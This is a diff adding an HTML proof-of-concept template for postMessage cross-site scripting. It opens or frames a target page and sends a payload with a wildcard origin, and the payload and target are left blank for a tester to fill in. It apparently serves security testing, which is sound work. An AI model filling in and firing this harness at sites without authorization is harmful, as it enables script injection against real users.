@@ -1,0 +1,46 @@
+<!doctype html>
+<html>
+    <head>
+        <!-- postMessage XSS PoC -->
+        <meta charset="UTF-8" />
+        <title>PostMessage PoC</title>
+        <script>
+            // Uncomment and update these variables
+            var payload = ""; 
+            var vulnPage = ""; // Target page here
+
+            function pocLink() {
+                let win = window.open(vulnPage); // Open the vulnerable page
+                let msg = payload; // Prepare the payload
+
+                // Delay to ensure the target page loads before postMessage
+                setTimeout(function () {
+                    if (win) {
+                        win.postMessage(msg, "*");
+                    } else {
+                        alert("Failed to open window. Check vulnPage URL.");
+                    }
+                }, 5000);
+            }
+
+            function pocFrame(win) {
+                let msg = payload; // Prepare the payload
+                win.postMessage(msg, "*");
+            }
+        </script>
+    </head>
+    <body>
+        <!-- PoC link to trigger postMessage -->
+        <a href="#" onclick="pocLink(); return false;">PoC Link</a>
+
+        <!-- Iframe to automatically send postMessage after load -->
+        <iframe src="" id="pocIframe" onload="pocFrame(this.contentWindow)"></iframe>
+
+        <script>
+            // Dynamically set the src attribute of the iframe
+            const iframe = document.getElementById("pocIframe");
+            iframe.src = vulnPage;
+        </script>
+    </body>
+</html>
+
